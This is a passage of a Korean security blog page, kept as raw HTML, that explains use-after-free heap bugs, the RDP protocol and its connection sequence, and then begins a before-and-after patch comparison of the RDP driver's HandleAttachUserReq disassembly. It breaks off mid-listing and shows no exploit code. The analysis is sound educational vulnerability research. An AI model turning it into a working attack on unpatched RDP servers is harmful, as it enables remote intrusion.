url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABTElEQVQY06WQzStEUQDFzyxYKBYsEJKSDLJQ4j+gNPPeve8+Y4adf8PGgoUlO4WkLFnYkWc+3vX17h01C7OzlCIiksKREMrOqdOp0zmbH5jJDAIAyd9enIt99FfgzFTsvftz98OoaQGmu/tqOT8L8hzcWwevS+Dywvu3EvWdPWjsbkdDvBfVrW1AXR1XF8DLEni8Be6sgadZ8PEMvCijojkOGD91kndkIatS2jhSh9LXeaG0Tbj72460wdBIdJAUJpB+lHW9IytUGEhfh46no6TQgVD6JD2ul8Soburoy8FIv5xzvWjPH7MmKWxBKJsTytqEY/OOjMLhEVN0PVNQKRMKZaz0bSCUDV3PRgnXBq6yxdG0XXFUsbVr4Bi4n6wlNz84PJVAvoB8BW8PQT6B5Q2QNz9YPXzmLXgXgXz+ZljVCExwuh+7El/Q/6s3cl3ftnkn3r4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image24\"\n        title=\"image24\"\n        src=\"/static/7c4b3479d5ba0c59c9fc6e7ac2ebd169/32056/image24.png\"\n        srcset=\"/static/7c4b3479d5ba0c59c9fc6e7ac2ebd169/e9ff0/image24.png 180w,\n/static/7c4b3479d5ba0c59c9fc6e7ac2ebd169/f21e7/image24.png 360w,\n/static/7c4b3479d5ba0c59c9fc6e7ac2ebd169/32056/image24.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>bufA의 메모리 상태를 보면 주소의 값은 바뀌지 않았다. 메모리 bufA, bufB가\n같은 주소를 가리키고 있다는 점을 알 수 있다. 이미 해제되었던 메모리 bufA\n가 메모리 할당자로 들어가고 새로운 메모리 영역을 할당할 때 메모리를\n효율적으로 관리하기 위해 기존에 해제하였던 메모리가 그대로 대입되어\n발생하는 현상이다.</p>\n<p>이미 해제되었던 메모리 bufA에 접근을 하면 bufB가 같이 영향을 받기 때문에\n개발자가 의도하지 않은 정상적인 범위를 벗어나게 되어 문제가 생긴다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAA7EAAAOxAGVKw4bAAACGklEQVQozyWK3U9ScQCG3/ljbV10UVktNFypa3WhskkBCvFlcU5wDnAO31ORck3gcABFZ5YtDpZ1k2ZZW10hbK1/xCFHSFl50bruH6i2rn4Nu3revc+DP7EI/3MqoqMQMVeKaqxv4mSsFNQAQDcu4AS6oEUfzuAsTuEkWDXbNf4iTCwbUWLdiBHrqxhxbE8RY4ojgzo9Ab0tGtZWIuj7EIV5MwzruzjMqwK06Dndg37defSeu6y5fq0XVy5qoevmfy3DvB6EZSsKy+sYbJtxON9P42aKw8AlPfBgJTw79Ez0j5XFoFERRHNZFM1rwcCNIn/fmOaKxpwvbZC8BUOOkww5b9r4JBAzPRcDplKnDYrjSki0vowKo0kmNKDTMxB3F2mwvUSFwyIVWkUa6PBLkboOUzRy9JAK7UXKHc3T0LdlyrfnqdAuHvf+gwXqay9Q38E8nfy+Sr1bs7S/Z4TC9Sm57qgknjprM4qzMqM4qgnFsZNQrDuTir2aKNsqU4qtOq04a0nFXulwRnHVkseNvZb47z4nS7dWwmvDV8eWEKClUf7HArhdGfxeHp59GR5VxoSaAtvMwt3IgGlmwbcKYBtZeJs5+FoFeBoy7jZluNUM+K8FMNv3MDRgAvx/H/P+34+0HymFp53XsA2JsHWJTNTnCKtmibueIW41QzyqfLw7n2dfJkxdIkxDIu69DPEe5smdtwkyPGgm/wAnY9ITzaeFbgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image25\"\n        title=\"image25\"\n        src=\"/static/a97169337b1417ed6d1bf5d77d59c810/0a47e/image25.png\"\n        srcset=\"/static/a97169337b1417ed6d1bf5d77d59c810/e9ff0/image25.png 180w,\n/static/a97169337b1417ed6d1bf5d77d59c810/f21e7/image25.png 360w,\n/static/a97169337b1417ed6d1bf5d77d59c810/0a47e/image25.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>해제된 포인터 bufA와 새로 할당된 bufB가 같은 메모리 영역을 가리키고 있기\n때문에 포인터 bufA에 “boan Project” 문자열을 복사한 후 포인터 bufB의\n내용을 출력하면 문자열이 바뀐 것을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAoklEQVQI1xXCSw6CMBAAUO7gBZjpUPtDFAwmRKB0IFAxRlcsXHoML298ecnttm7b9ny9wjjGGOclLjGu692P0+7zpceb2ytPU9M0fe+7rq/ri5SqrOpDUSbeh4HZh9D2vqzOSlutnTZOap3mJdrCGOvyQiljrTPWyb0iknJvKFMJ8+gDD8zTvBxPFWCWAqUgUkGACCgACYAQ/wEFChIiA/z/AbqJJC3SEwjVAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image26\"\n        title=\"image26\"\n        src=\"/static/385c0dee899a171d502c51fe88420cb6/d8f62/image26.png\"\n        srcset=\"/static/385c0dee899a171d502c51fe88420cb6/e9ff0/image26.png 180w,\n/static/385c0dee899a171d502c51fe88420cb6/f21e7/image26.png 360w,\n/static/385c0dee899a171d502c51fe88420cb6/d8f62/image26.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>메모리를 부여하는 동적 메모리 함수들은 환경에 따라 다르겠지만 효율성을\n위해 이미 해제하였던 메모리를 재사용한다. 이렇게 해제된 메모리 포인터에\n만약 데이터를 쓰게 된다면 다른 영역에서 사용하고 있던 메모리에 데이터가\n작성이 되어 큰 문제를 발생한다.</p>\n<p>프로그램을 개발하면서 대규모로 진행되어 구조가 복잡 해질수록 UAF\n취약점은 코드 영역에서 부분적으로 나타난다. 구성이 다른 컴포넌트들이\n결합된 형태의 프로그램에서 두 컴포넌트가 서로 연결성을 띄면서 동작하는\n경우 컴포넌트에서 객체나 메모리의 사용을 끝났다고 인지하여 해제를\n하였지만 다른 컴포넌트에서는 해제되었다는 사실을 알지 못한 채 해제된\n메모리를 그대로 사용할 수 있게 된다.</p>\n<p>힙 메모리를 사용하는 프로그램에서는 메모리를 할당하는 부분이 동작이 다\n다르기 때문에 UAF 취약점의 영향력은 판단하기가 어렵다. 현존하는\n프로그램에서 공격이 불가능하다고 알려진 버그가 UAF 취약성을 통해서\n실제로는 공격이 가능했던 취약점인 경우가 많이 발생한다.</p>\n<h3 id=\"rdp-remote-desktop-protocol\" style=\"position:relative;\"><a href=\"#rdp-remote-desktop-protocol\" aria-label=\"rdp remote desktop protocol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RDP (Remote Desktop Protocol)</h3>\n<p><strong>1. RDP (Remote Desktop Protocol) 이해</strong></p>\n<p>RDP 프로토콜은 기본적으로 원격 컴퓨터 시스템과의 연결에 있어서 그래픽\n적인 기능을 만족하도록 설계가 되었으며 사용자의 컴퓨터와 원격 컴퓨터\n시스템과의 동작 사이에 확장적인 전송 메커니즘을 제공한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\n <span class=\"token number\">1.</span>  비디오 드라이버를 사용하여 렌더링 정보를 네트워크 패킷으로       \n     구성하고 네트워크를 통해 네트워크를 통해 클라이언트로 전송하여   \n     디스플레이 출력을 렌더링 한다<span class=\"token punctuation\">.</span>                                   \n                                                                      \n <span class=\"token number\">2.</span>  클라이언트에서 RDP 프로토콜은 렌더링 데이터를 받고 패킷을 해당   \n     그래픽 장치 인터페이스 <span class=\"token punctuation\">(</span>GDI<span class=\"token punctuation\">)</span> API 호출로 해석한다<span class=\"token punctuation\">.</span>                \n                                                                      \n <span class=\"token number\">3.</span>  입력 경로의 경우 클라이언트 마우스 및 키보드 이벤트가            \n     클라이언트에서 서버로 리다렉션된다<span class=\"token punctuation\">.</span>                              \n                                                                      \n <span class=\"token number\">4.</span>  서버에서 RDP 프로토콜은 자체 키보드 및 마우스 드라이버를         \n     사용하여 이벤트를 수신한다<span class=\"token punctuation\">.</span>                                      \n</code></pre></div>\n<p><strong>2. RDP 프로토콜 기능</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 547px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 88.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAIAAADUsmlHAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACvElEQVQ4y12TSY/bOBSE9efitruRoJdJkFxnDgkwl/mpDS+0QtGiRIoUqc2k1BZJLe2gxSQD5Lvp8FRV7xWD9x8+f/323937T5u7j7d3H1frh5vN02r9+G51v1o/rNaPf//z74f7L+9W95vbp9XNw836cXP712r9uN48BUqpoiiVUsaYPM8ROmGMD4fDdrtFCMVxvNvt4jiGMErTFMIIQkgphTCK4zhoW80501o75/q+55wTQjDGEELOeZqmGOMkSSil6YIQIs/zvu+11oHW7evrq14oyxIA4JUPh0OSJMfjESEUhuH3Be8liiJKaZZlQdd10zQZY4ZhmOfZ68RxbIyx1jrn5nkex9E5Z62dpslaO8/zNE3zPAdpmjLGhBDjOBZF4b1xztmClJJz7nWEEEmSYIzbtu37/nK5BNba6/VqrR2GwRhDF/zM7/x+pizLOI7zPMcYSynrug6apjHGnM9npZTWervdAgAghACA/X6/2+0ghPv9PgzD4wIAACEEISyK4n9l55xXLoqirmu34B1Zay+XS9/3/iLGGK1127aBEKKqqqZppmnSWiOE/AqqqiKEcM6bpvHhX15emqYpFoQQb8N1XXdd17atV2CMUUoZY6fTKcuyqqoghIQQa+3LQtd1Sqm+79+G/7B9Op2SJPF7IoRQSgkhjDFCyPl89pNVVfV9r5T6ubCmaZRSTdMcDocoisDC918ghJ6fn/1RPb5qweVyqarKOedLkuc5ISRJEsaYzy+l9EHEgpQySZIsy8qyDHwAfydrLefca2ZZBgDw9UzTVEqpfnE+n4dhcM4FbduO49h1nXOOUooQwhiHYRhF0WkhiiLvAgAQxzEAgHNeVdVbZillnudCCN9wKWVZlv4x+VP55fnmZVnmf3o8HjHGP7ftK3G9Xv27YYz99matHRf8p+/JOI7GmB/xGbMtJLPJGwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 5 4 2\"\n        title=\"image 5 4 2\"\n        src=\"/static/d1f902f659ebffcc4633f758357c5ded/977f7/image-5.4.2.png\"\n        srcset=\"/static/d1f902f659ebffcc4633f758357c5ded/e9ff0/image-5.4.2.png 180w,\n/static/d1f902f659ebffcc4633f758357c5ded/f21e7/image-5.4.2.png 360w,\n/static/d1f902f659ebffcc4633f758357c5ded/977f7/image-5.4.2.png 547w\"\n        sizes=\"(max-width: 547px) 100vw, 547px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>3. RDP 기반의 애플리케이션 설계 구성</strong></p>\n<p>RDP 기반의 애플리케이션을 설계 구성요소로 터미널 서버, 전송 프로토콜,\n클라이언트 로 구성된다. 일반적으로 원격 데스크톱 연결의 제어 터미널로\n불리며 서버는 제어가 되는 터미널이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 45.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACgElEQVQozzWSz2sTURDHJ0lTk23UVBCqtSXppvvmvbebdJPdfZtsk9rSX0na1Jg2iUYjCmkvWnsQFEGpt15KAwqC6KW3gl4qIiiI0Jugt17Eizf/BMXDyrY48IWZy2eG73wBmYBEXAOvjMlKkKr2LOU2RSZyyEQembiGXBSRHWkKmSWQi2nKRYZykU/p+d7hWBIoF0CoCYDMiiAaJzzgM9c9AscGEgFkVh9SK4jMChBq+pFZoCbHfcisEFLzFOWiDyDgcwrzcG4QA5QLCakpAWWWRLmIMi2bJ2g4lIsJlswlRmLcj9ySPBCiBZTagN4V3AozTQRzU/Og6c6klsrdS6YcWc9MeMeF4ObL16A7c7X1/QP30befv+8fHLq1x9t7ruvC1JXbYUXOAK1PgEJM8PrRWDrcancCO6+eQ7naeFderLul8sraXLEG2dxsCB5++QHmdLX95PCXu7zZ/eMBV3fffvCA0+vrUeW87kcucsiFNSIxn1rIn25srPa8//oJllZaby5dbrmLlWZnsdL0gGHPMl96oiyWN3c+xIfw78Xm6vfqg607ANCTaZUKynB6mGqCUs1GZSg9pDdmCqXtW9Lu5z2o/gcuNTsLlcYxkI85ET1fhMH+C3epartyTP0IAJK3iaTMk4kbWZBlHQbPIsQ3HKCZbKRxtd3zovsUKgv1/fJC3S2Wl9fmSzWwszMhz8g+LzZqulBGZnVYMnddHy/217e6QIgZJsQEOaGDLI95MyiKEUYq/LqYBKbZba5lu0y100y1AanV6+Un4mWIa7leyu04Ve0ooQYQZgYIMyXCTDj6NLOAHEtSqOFXk45fIcZAfGTsjIJGdJQYoKAZ/AcMa6VJGA6S9wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image27\"\n        title=\"image27\"\n        src=\"/static/66e9b456a76afcbf61f37d5e997817e2/d8f62/image27.png\"\n        srcset=\"/static/66e9b456a76afcbf61f37d5e997817e2/e9ff0/image27.png 180w,\n/static/66e9b456a76afcbf61f37d5e997817e2/f21e7/image27.png 360w,\n/static/66e9b456a76afcbf61f37d5e997817e2/d8f62/image27.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>4. RDP 프로토콜 연결 과정</strong></p>\n<p>RDP 프로토콜의 표준 연결 순서는 클라이언트와 서버의 설정 정보를 상호\n교환하면서 입력된다. 그래픽 정보, 데이터 등을 상호 교환을 하면서\n클라이언트와 서버 간에 연결을 진행</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"> <span class=\"token number\">1.</span>  클라이언트 서버가 네트워크 소켓 계층 초기 연결을 한 다음 RDP를   \n     설정                                                             \n                                                                      \n <span class=\"token number\">2.</span>  프로토콜의 기본 연결이 확인된 후에만 통신을 시작한다<span class=\"token punctuation\">.</span>            \n                                                                      \n <span class=\"token number\">3.</span>  클라이언트와 서버의 시스템 환경과 RDP 연결 환경 간의 정보 교환   \n     및 연결 확인 작업을 수행 <span class=\"token punctuation\">(</span>Connect Initial PDU<span class=\"token punctuation\">)</span>                   \n                                                                      \n <span class=\"token number\">4.</span>  RDP 프로토콜에서 이미지 정보<span class=\"token punctuation\">,</span> 사운드 정보<span class=\"token punctuation\">,</span> 장치 정보 및 클립     \n     보드 컨텐츠는 모두 단일 가상 채널에 존재한다<span class=\"token punctuation\">.</span>                    \n                                                                      \n <span class=\"token number\">5.</span>  전송용 가상 채널의 초기화 정보는 Connect Initial PDU 과정에서    \n     완료된다<span class=\"token punctuation\">.</span>                                                        </code></pre></div>\n<p>※ Protocol Data Unit (PDU): 데이터 통신에서 상위 계층이 전달한 데이터에\n붙이는 제어정보 e.g. ‘네트워크 계층 (packet), 전송 계층 (segment)’</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 540px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 147.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,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'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image28\"\n        title=\"image28\"\n        src=\"/static/5c901388207e2deb0a198ac931f6bf3d/07484/image28.png\"\n        srcset=\"/static/5c901388207e2deb0a198ac931f6bf3d/e9ff0/image28.png 180w,\n/static/5c901388207e2deb0a198ac931f6bf3d/f21e7/image28.png 360w,\n/static/5c901388207e2deb0a198ac931f6bf3d/07484/image28.png 540w\"\n        sizes=\"(max-width: 540px) 100vw, 540px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 546px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 112.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAXCAIAAACEf/j0AAAACXBIWXMAAA7DAAAOwwHHb6hkAAADlElEQVQ4yz2U23KkNhCG58XW9qydVNm73uQiL7B7mbyrXWUzHCUkxFlIgJCEhpkBUqBKviugqun+++/uw/Hx+/Hx9fnlr5+//nn87Y+vTz8evm5f7u5f7o/fjo+vD8fvX59+/Pz199Pvf94dv909vHy5f/5y/3x8fD1w3mo9SinFMCiltB6bpun7Po7jt7c3xzlFUeS67uen4zgn3/cxxnGMAYSM8cPlclmWOctSQpKyLNZ1PZ/Pt9ttmqYsy8qyaJomjmNKaVEUnHNjjFLqcrms63pQShVFgRBKkiQIgrqujTG32y3Pc0IISVMIACGkruv9bQMAEMexEOKgtV6WZf2PZVmUUtM0jeOYZRkhBGNsf4QQyrIMY5xlmdbaGHOQUmqtMcZFUWRZdj6f+76XUqZpGgTBJvR0CncAABDCIAjCMEQI9X1/4Jzbgl3X9X0/jmOt9TzPQggrUggxjqPWum3bYW9q3/fjOG6aGWPDMGitpZRKqa7rGGNSyrIsPz8/syxr27baYYzVO3RHa7112xhDCCl3brebMWaapq7rMMYAAEqplHLYEUJYUcMwLMtyOJ/PaZp6nocQ8n2fUnq5XG632zAMNkOe50KIruuaprEJpJRd112v161h087lcrEPViTnPAxDm9z3fQghQggA4DgOpZRzPgzD5rMQIgiCJEkQQlprIYTWummaKIoghFEUhWFo5wxjHIZhnud1XXddd7her8aY/51YlsVOmJSyKLbxopSWZZnnOcaYEMIY6/ve6t/KZozZYN/3lVLWD845AMAm//j4iKLodDoFQYAx5pxTShljW7AVhnbyPLfTwzmP49gGQwht8qqqbM1VVdV1fUAIYYwhhJ7nQQhd183z3BgjhIh3XNdtmsa2pu972/a+76dpOozjuCyL/WqMWddVKWWM6fs+SRJCSLSDMUYIWfOapmnbdrNqmqZ1XQkhjuOUZbmuq92qtm1tcFVVaZqWZUkptX1qmmae52087ZSO42jttZntekAIkyQBO/kOhNAKyfN8nudtMbquAwC4rpskSdd1bdsqpSilCKEwDF3X9TzPcRwAQBAEWZalaUoI2awqy9KuXhiGnucBABhjWuu6rgEAYRgGQeB53vv7++m0nSHGWLuz7fM4jtfrlRACACiKYp5newzatrXDpHZsR+1K2M3byu66Lk1Tex+CIEjTVEo5z3NVVdY8215rMue8KAohhD07/wJBqMQ9bGQ8LQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 5 4 3\"\n        title=\"image 5 4 3\"\n        src=\"/static/d7d5b443a7cd532887c9fd85a81e4d34/76aed/image-5.4.3.png\"\n        srcset=\"/static/d7d5b443a7cd532887c9fd85a81e4d34/e9ff0/image-5.4.3.png 180w,\n/static/d7d5b443a7cd532887c9fd85a81e4d34/f21e7/image-5.4.3.png 360w,\n/static/d7d5b443a7cd532887c9fd85a81e4d34/76aed/image-5.4.3.png 546w\"\n        sizes=\"(max-width: 546px) 100vw, 546px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>※ X.224: X.224 연결 요청 PDU는 RDP 연결 시퀀스의 연결 시작 단계 동안\n클라이언트에서 서버로 전송되는 RDP 연결 시퀀스 PDU이다.</p>\n<h2 id=\"rdp-드라이버-패치-전-후-코드-비교\" style=\"position:relative;\"><a href=\"#rdp-%EB%93%9C%EB%9D%BC%EC%9D%B4%EB%B2%84-%ED%8C%A8%EC%B9%98-%EC%A0%84-%ED%9B%84-%EC%BD%94%EB%93%9C-%EB%B9%84%EA%B5%90\" aria-label=\"rdp 드라이버 패치 전 후 코드 비교 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RDP 드라이버 패치 전 후 코드 비교</h2>\n<p><strong>1. CVE-2012-0200 취약점 패치 전 RDP 드라이버 (v6.1.7600.16385) 버그\n발생 부분</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token function\">HandleAttachUserReq</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 함수에서 코드 수정이 이루어졌다<span class=\"token punctuation\">.</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">900</span>         lea     eax<span class=\"token punctuation\">,</span> \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">903</span>         push    eax\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">904</span>         push    \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">907</span>         add     esi<span class=\"token punctuation\">,</span> <span class=\"token number\">74</span>h\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">90</span>A         push    esi\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">90</span>B         call    SListRemove\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">910</span> quit<span class=\"token operator\">:</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token 